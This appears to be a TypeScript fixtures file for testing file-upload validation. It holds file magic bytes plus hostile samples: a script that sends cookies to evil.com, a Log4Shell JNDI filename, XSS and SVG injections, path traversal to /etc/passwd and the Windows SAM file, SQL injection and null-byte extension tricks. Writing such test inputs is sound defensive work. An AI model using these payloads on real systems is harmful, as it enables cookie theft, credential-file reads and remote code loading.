/**
 * Test file fixtures for security testing
 */

// JPEG magic number: FF D8 FF
export const jpegFileBytes = new Uint8Array([
  0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
  // ... rest of JPEG header
])

// PNG magic number: 89 50 4E 47 0D 0A 1A 0A
export const pngFileBytes = new Uint8Array([
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
  0x49, 0x48, 0x44, 0x52
  // ... rest of PNG header
])

// PDF magic number: 25 50 44 46
export const pdfFileBytes = new Uint8Array([
  0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34, 0x0A, 0x25, 0xC4, 0xE5,
  // ... rest of PDF header
])

// GIF magic number: 47 49 46 38
export const gifFileBytes = new Uint8Array([
  0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
  // ... rest of GIF header
])

// MP3 magic number: 49 44 33 (ID3)
export const mp3FileBytes = new Uint8Array([
  0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x23, 0x54, 0x49,
  // ... rest of MP3 header
])

// Malicious file disguised as image (script content with JPEG header)
export const maliciousFileBytes = new Uint8Array([
  0xFF, 0xD8, 0xFF, // JPEG magic number
  ...new TextEncoder().encode('<script>alert("xss")</script>')
])

// Create File-like objects for testing
export function createTestFile(
  bytes: Uint8Array, 
  filename: string, 
  mimeType: string
): File {
  const blob = new Blob([bytes], { type: mimeType })
  return new File([blob], filename, { type: mimeType })
}

// Text file with malicious content
export const maliciousTextContent = `
<html>
<head><title>Test</title></head>
<body>
  <script>
    document.cookie = "stolen=" + document.cookie;
    window.location = "https://evil.com?" + document.cookie;
  </script>
  <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))" />
  <iframe src="javascript:alert('XSS')"></iframe>
  <svg onload="alert('SVG XSS')">
</body>
</html>
`

// SVG with script injection
export const maliciousSvgContent = `
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <script>alert('SVG Script')</script>
  <foreignObject><iframe src="javascript:alert('XSS')"></iframe></foreignObject>
</svg>
`

// Test filenames with various attack vectors
export const dangerousFilenames = [
  '../../../etc/passwd',
  '..\\..\\windows\\system32\\config\\sam',
  'test<script>alert("xss")</script>.jpg',
  'test"; DROP TABLE files; --.jpg',
  'CON.jpg',
  'PRN.txt',
  'AUX.png',
  'NUL.pdf',
  'COM1.gif',
  '.htaccess',
  'web.config',
  '${jndi:ldap://evil.com/x}',
  '%00.jpg%00.php',
  'test\x00.php\x00.jpg',
  'test\r\n.jpg',
  '     ', // Only spaces
  '', // Empty string
  '.', // Current directory
  '..', // Parent directory
  'test file with spaces.jpg',
  'test|file>redirect<.jpg',
  'test?query=param&other=value.jpg',
  'test*wildcard.jpg',
  'very_long_filename_that_exceeds_normal_limits_and_could_cause_buffer_overflow_or_other_issues_in_poorly_written_code_' + 'x'.repeat(300) + '.jpg'
]

// Test metadata with injection attempts
export const maliciousMetadata = {
  description: '<script>alert("xss")</script>',
  alt: 'javascript:alert("xss")',
  category: '"; DROP TABLE files; --',
  tags: ['<img src=x onerror=alert(1)>', 'javascript:void(0)'],
  customField: '\x00\x01\x02\x03', // Null bytes and control characters
  longField: 'x'.repeat(10000), // Very long content
  objectField: { nested: { deep: { attack: '<script>' } } }, // Complex object
  arrayField: [1, 2, { attack: 'payload' }], // Mixed array
  functionField: () => 'attack', // Function (should be filtered)
  symbolField: Symbol('attack'), // Symbol (should be filtered)
}

export default {
  jpegFileBytes,
  pngFileBytes,
  pdfFileBytes,
  gifFileBytes,
  mp3FileBytes,
  maliciousFileBytes,
  createTestFile,
  maliciousTextContent,
  maliciousSvgContent,
  dangerousFilenames,
  maliciousMetadata,
}